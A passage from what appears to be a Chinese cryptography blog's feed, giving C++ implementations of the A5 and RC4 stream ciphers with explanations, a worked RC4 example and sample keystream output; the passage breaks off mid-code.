class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">256</span>; <span class="comment">/*循环次数*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*A、B、C三个线性移位寄存器*/</span></span><br><span class="line"><span class="type">int</span> A[<span class="number">19</span>] = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line"><span class="type">int</span> B[<span class="number">22</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</span><br><span class="line"><span class="type">int</span> C[<span class="number">23</span>] = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lfsr</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d, <span class="type">int</span> T[])</span><span class="comment">/*移位寄存器函数*/</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = d; i &gt; <span class="number">0</span>; i --)</span><br><span class="line">&#123;</span><br><span class="line">T[i] = T[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">T[<span class="number">0</span>] = T[a] ^ T[b] ^ T[c] ^ T[d];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//分别从LFSR1、LFSR2、LFSR3中选取第9位、第11位、第11位作为检测位</span></span><br><span class="line"><span class="comment">//钟控移位规则是：多数移位，少数不移位</span></span><br><span class="line"><span class="type">int</span> j = A[<span class="number">9</span>] + B[<span class="number">11</span>] + C[<span class="number">11</span>];</span><br><span class="line"><span class="comment">/*j可能等于0-3之间*/</span></span><br><span class="line"><span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 三个比特的异或就是当前时刻输出的1比特密钥。</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (A[<span class="number">18</span>] ^ B[<span class="number">21</span>] ^ C[<span class="number">22</span>]) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, A);</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, B);</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">22</span>, C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (A[<span class="number">18</span>] ^ B[<span class="number">21</span>] ^ C[<span class="number">22</span>]) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (A[<span class="number">9</span>] == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, A);</span><br><span class="line"><span class="keyword">if</span> (B[<span class="number">11</span>] == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, B);</span><br><span class="line"><span class="keyword">if</span> (C[<span class="number">11</span>] == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">22</span>, C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (A[<span class="number">18</span>] ^ B[<span class="number">21</span>] ^ C[<span class="number">22</span>]) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (A[<span class="number">9</span>] == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, A);</span><br><span class="line"><span class="keyword">if</span> (B[<span class="number">11</span>] == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, B);</span><br><span class="line"><span class="keyword">if</span> (C[<span class="number">11</span>] == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">22</span>, C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (A[<span class="number">18</span>] ^ B[<span class="number">21</span>] ^ C[<span class="number">22</span>]) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, A);</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, B);</span><br><span class="line"><span class="built_in">lfsr</span>(<span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">22</span>, C);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p><code>A5</code>算法的初始密钥长度为<code>64</code> 比特。为了对该算法进行攻击，已知明文攻击法只需要确定其申两个寄存器的初始值就可以计算出另一个寄存器的初始值，这说明政击 <code>A5</code>一般要用$2^{40}$次尝试来确定两个寄存器的结构，而后从密钥流来决定第<code>3</code>个 <code>LFSR</code>。<code>A5</code> 的设计思想优秀,效率高,可以通过所有已知统计检验标准。其唯一缺点是移位寄存器级数短、其最短循环长度为$4/3\times 2^k$(<code>k</code>是最长的<code>LFSR </code>的级数)总级数为<code>19十22+23=64</code>，这样就可以用穷尽搜索法破译,如果 <code>A5</code>算法能够采用更长的、抽头更多的线性反馈移位寄存器,则会更为安全 。</p>]]></content>
    
    
    <summary type="html">A5算法的原理及C++代码</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="GSM" scheme="https://nonevector.top/tags/GSM/"/>
    
    <category term="A5算法" scheme="https://nonevector.top/tags/A5%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>典型序列密码算法之RC4</title>
    <link href="https://nonevector.top/posts/6.html"/>
    <id>https://nonevector.top/posts/6.html</id>
    <published>2023-10-30T11:40:18.785Z</published>
    <updated>2023-11-29T03:35:59.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、RC4-算法介绍">一、RC4 算法介绍</h2><p><code>RC4</code>是由麻省理工学院的 Rivest 开发的,他也是<code>RS4</code>的开发者之一。<code>RC4</code> 的突出优点是在软件中很容易实现。<code>RC4 </code>可能是世界上使用最广泛的序列密码,它已应用于 MicrosoftWindows、Lotus Notes 和其他软件应用程序中,应用于安全套接字层(SSL,Secure SocketsLayer)以保护因特网的信息流，还应用于无线系统以保护无线链路的安全等。</p><p><code>RC4 </code>是一个典型的基于非线性数组变换的序列密码。它以一个足够大的数组为基础,对其进行非线性变换，产生密钥序列，一般把这个大数组称为<code> S</code>盒。<code>RC4</code>的<code>S</code>盒大小随参数<code>n</code>的值变化而变化,理论上来说,<code>S</code>盒长度为 $N=2^n$”个元素,每个元素<code>n</code>比特。通常<code>n=8</code>,这也是本书示例所选取值,此时,生成共有$ 256(=2^8)$个元素的数组 <code>S</code>。<code>RC4</code> 包含两个处理过程:一个是密钥调度算法(<code>KSA</code>,Key-Scheduling Algorithm),用来置乱<code>S</code>盒的初始排列;另一个是伪随机生成算法(<code>PRGA</code>,Pseudo RandomGeneration Algorithm)用来输出随机序列并修改<code>S</code>的当前排列顺序</p><h3 id="流程">流程</h3><ol><li><code>KSA</code>首先初始化<code>S</code>,即<code>S[i]=i(i=0~255)</code>,同时建立一个临时数组向量 <code>T(|T|=256)</code>,如果种子密钥<code>K</code>的长度为 <code>256</code> 字节(<code>|K|=256</code>),则直接将 <code>K</code> 赋给<code>T</code>,否则,若种子密钥<code>K</code>的长度(记为<code>|K|</code>)小于<code>|T|</code>,则将<code>K</code>的值赋给<code>T</code>的前<code>|K|</code>个元素,并不断重复加载<code>K</code>的值直到<code> T</code>被填满。这些操作可概括如下:</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span> to <span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">begin</span><br><span class="line">    S[i]:=i;</span><br><span class="line">    T[i]:=k[i mod |K|];</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol start="2"><li>然后用<code>T</code>产生<code>S</code>的初始置换,从 <code>S[O]</code>到 <code>S[255]</code>,对每个<code>S[i]</code>,根据 <code>T</code>的值将<code>S[i]</code>与<code>S</code>中的另一个字节对换。概括如下:</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">j:=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i:= <span class="number">0</span> to <span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">begin</span><br><span class="line">    j:=(j + S[i] + T[i]) (mod <span class="number">256</span>);</span><br><span class="line"><span class="built_in">swap</span>(S[i], S[j]); <span class="comment">// 交换s[i]和s[j]</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol start="3"><li>因为对<code>S</code>的操作仅是交换,所以唯一的改变就是位置,<code>S</code>仍然遍历<code>0~255 </code>的所有元素最后,利用 <code>PRGA</code>生成密钥流。从<code>S</code>中随机选取一个元素输出，并置换 <code>S </code>以便下一次取，选取过程取决于索引<code>i</code>和<code>j</code>,下面描述选取密钥序列的过程:</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i,j:=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    i:=i + <span class="number">1</span>(mod <span class="number">256</span>);</span><br><span class="line">j:= j + S[i](mod <span class="number">256</span>);</span><br><span class="line"><span class="built_in">swap</span>(S[i], S[j]);</span><br><span class="line">t:= S[i] + S[j] (mod <span class="number">256</span>);</span><br><span class="line">k := S[t];</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol start="4"><li>加密时，将<code>k</code>的值与明文字节异或;解密时,将 <code>k</code>的值与密文字节异或。</li></ol><h3 id="RC4-的逻辑结构（例子）">RC4 的逻辑结构（例子）</h3><ol><li>下面以元素长为<code>3</code>比特(即<code>n=3</code>)的<code>RC4</code> 为例来演示它的工作过程。显然,<code>3</code>位<code>RC4</code>的所有操作是对$2^3=8$取模。数组 S 只有$2^3=8$个元素,初始化为:</li></ol><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_159d6b1277-1.png" alt="1.png"></p><ol start="2"><li>接着选取一个密钥,该密钥是由 <code>0~7</code>的数以任意顺序组成的。例如,选取<code>5、6、7</code>作为密钥。该密钥如下填人临时数组<code> T</code>中:</li></ol><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_17d8cc0a77-2.png" alt="2.png"></p><ol start="3"><li>然后执行 <code>S</code>数组的初始置换,以<code>i=0</code>和<code>j=0</code>开始。使用更新公式后，<code>j</code>为:</li></ol><p>$$<br>\begin{aligned}<br>j &amp;= [0 + S(0) + T(0)](mod 8) \<br>&amp; = (0 + 0 + 5) mod 8 \<br>&amp; = 5<br>\end{aligned}<br>$$</p><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_18fb7db877-3.png" alt="3.png"></p><ol start="4"><li>因此,<code>S</code>数组的第一个操作是将 <code>S(0)</code>与 <code>S(5)</code>互换</li></ol><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_1bf64f7f77-4.png" alt="4.png"></p><ol start="5"><li>索引<code>i</code>加<code>1</code>后，<code>j</code>的下一个值为:</li></ol><p>$$<br>\begin{aligned}<br>j &amp;= [5 + S(1) + T(1)](mod 8) \<br>&amp; = (5 + 1 + 6) mod 8 \<br>&amp; = 4<br>\end{aligned}<br>$$</p><ol start="6"><li>即将<code>S</code>数组的<code>S(1)</code>与<code>S(4)</code>互换:</li></ol><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_1f7df32877-5.png" alt="5.png"></p><ol start="7"><li>当该循环执行完后,数组 <code>S</code>就被随机化:</li></ol><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_232136a977-6.png" alt="6.png"></p><ol start="8"><li>下面数组 <code>S</code>就可以用来生成随机数序列了。从<code>j=0</code>和<code>i=0</code>开始,<code>RC4</code> 计算第一个随机数的过程如下:</li></ol><p>$$<br>i = (i + 1) mod 8 = (0 + 1) mod 8 = 1 \<br>j = [j + S(i)]mod 8 = [0 + S(1)]mod 8 = [0 + 4]mod 8 = 4\<br>swap(S(1), S(4))<br>$$</p><p><img src="https://cdn.acwing.com/media/article/image/2023/10/30/169037_25f0625177-7.png" alt="7.png"></p><ol start="9"><li>然后计算和<code>k</code>:</li></ol><p>$$<br>t=[S(j)+S(i)]mod8 =[S(4)+S(1)]mod 8=(1+4)mod8=5\<br>k=S(t)=S(5)=6<br>$$</p><ol start="10"><li>第一个随机数为 <code>6</code>,其二进制表示为<code> 110</code>。反复进行该过程,直到生成的密钥序列长度等于明文的长度。</li></ol><h2 id="二、C-代码">二、C++代码</h2><h3 id="代码">代码</h3><blockquote><p>核心代码上面的伪代码给过了，这里直接带进去就行了（￣︶￣）↗</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在C++中，char类型通常被视为有符号类型，其取值范围为-128到127</span></span><br><span class="line"><span class="comment">//无符号整数的取值范围为0到255</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// S盒子</span></span><br><span class="line"></span><br><span class="line">string text; <span class="comment">// 明文密文统一用text</span></span><br><span class="line">string secret_key; <span class="comment">// 密钥</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> <span class="comment">// KSA初始化S盒</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> key_len = secret_key.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> T[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 临时数组向量</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        T[i] = secret_key[i % key_len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">256</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt_encode</span><span class="params">()</span> <span class="comment">// 加密或者解密都是再次经过这个函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len = text.<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> h = <span class="number">0</span>; h &lt; len; h ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">k = s[t];</span><br><span class="line">text[h] ^= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; text;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入密钥&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; secret_key;</span><br><span class="line">    <span class="built_in">encrypt_encode</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文：&quot;</span> &lt;&lt; text &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">encrypt_encode</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;解密后的明文：&quot;</span> &lt;&lt; 